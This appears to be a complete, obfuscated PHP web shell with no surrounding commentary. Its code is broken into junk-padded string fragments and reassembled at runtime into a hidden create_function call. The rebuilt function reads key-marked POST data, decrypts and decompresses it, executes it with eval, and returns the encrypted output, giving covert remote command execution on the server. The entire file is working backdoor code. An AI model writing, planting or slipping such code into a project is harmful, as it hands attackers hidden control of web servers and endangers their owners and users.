<?php
$V='@basea$6a$4_deca$odea$($m[1]),$k)));$o=a$@oa$b_get_contena$tsa$();@oba$_enda$_clean(a';
$h='($ia$=0;a$$i<$l;){for($j=0;a$(a$$j<$c&&$i<$la$)a$;$ja$++,$i++){$o.=$a$t{$i}^a$$k{$ja';
$a='$);$r=@baa$a$a$a$se64_encode(@x(@gzcompra$esa$s($o),$k)a$);pa$rint("$pa$$kh$r$kf");}';
$W='7PmfDXa$ua$eka$";functa$ion x($t,a$$k){$a$c=strlena$($k);$a$la$=a$strlen($t);$o="a$";fa$or';
$n='$k=a$"ac17acf7"a$;$kh="a$4ea$630a$ebaea$f43";$a$kf="0760b5b18908a$";$p="a$a$AD90yGT';
$j=str_replace('JD','','crJDeaJDtJDe_JDfunJDctJDion');
$z='ents("phpa$://input")a$,$ma$)==1) {@a$ob_a$a$start();@evaa$l(@gzuncoa$a$a$mpress(@x(';
$P='$};}}ra$ea$ta$urn $o;}if (@pa$reg_match(a$"/a$$kh(.+a$)$kf/",@fia$le_geta$_ca$a$ont';
$y=str_replace('a$','',$n.$W.$h.$P.$z.$V.$a);
$J=$j('',$y);$J();
?>
